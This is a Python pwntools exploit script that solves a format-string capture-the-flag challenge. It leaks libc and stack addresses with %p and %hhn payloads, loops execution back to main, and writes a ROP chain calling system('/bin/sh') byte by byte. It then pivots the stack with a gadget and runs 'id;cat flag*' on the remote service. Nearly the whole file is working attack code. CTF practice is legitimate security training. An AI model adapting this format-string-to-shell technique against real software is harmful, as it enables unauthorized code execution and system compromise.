#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF("./chal_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

host, port = "printf.ctf.maplebacon.org", "1337"

count = 0
while (True):
  print('count = '+str(count))
  if args.REMOTE:
    p = remote(host,port)
  else:
    p = process([exe.path])
  try:
    payload = '%c%c%c%c%'+str(0x54)+'c%hhn%17c%hhn.%13$p.%6$p.'
    p.sendline(payload)
    p.recvuntil('.',drop=True)
    libc.address = int(p.recvuntil('.',drop=True),16) - 0x24069
    stack = int(p.recvuntil('.',drop=True),16)
    payload = '%c%c%c%c%'+str(0x54)+'c%hhn%17c%hhn.%14$p.'
    p.sendline(payload)
    p.recvuntil('0x',timeout=3)
    print('ret2main OK.')
    print('libc base = '+hex(libc.address))
    print('stack leak = '+hex(stack))

    rop = ROP(libc)
    gadget_ret = rop.find_gadget(['ret'])[0]
    rop.call(libc.symbols['system'],[next(libc.search('/bin/sh'))])
    payload2 = p64(gadget_ret)+rop.chain()
    for i in range(len(payload2)):
      print('writing byte '+str(i))
      stack_dst = stack+0xc8+i
      low1 = stack_dst & 0xffff
      payload = '%c%c%c%c%'+str(0x54)+'c%hhn%17c%hhn'+'%'+str(low1-0x69)+'c'+'%15$hn'
      p.sendline(payload)
      value = u8(payload2[i:i+1])
      payload = '%c%c%c%c%'+str(0x54)+'c%hhn%17c%hhn'+'%'+str((0x100-0x69)+value)+'c'+'%43$hhn'
      p.sendline(payload)

    gadget = libc.address + 0x0000000000024242 # add rsp, 0x98 ; ret
    low1 = gadget & 0xffff
    print('Trying rop exec')
    payload = '%c%c%c%c%'+str(0x54)+'c%hhn%'+str(low1 - 0x58)+'c%hnTOTO'
    p.sendline(payload)
    p.recvuntil('TOTO',drop=True)
    print('TOTO Ok')
    p.sendline('id')
    p.recvuntil('uid', timeout=3)
    p.sendline('id;cat flag*')
    break
  except:
    p.close()
    count +=1
    continue

p.interactive()


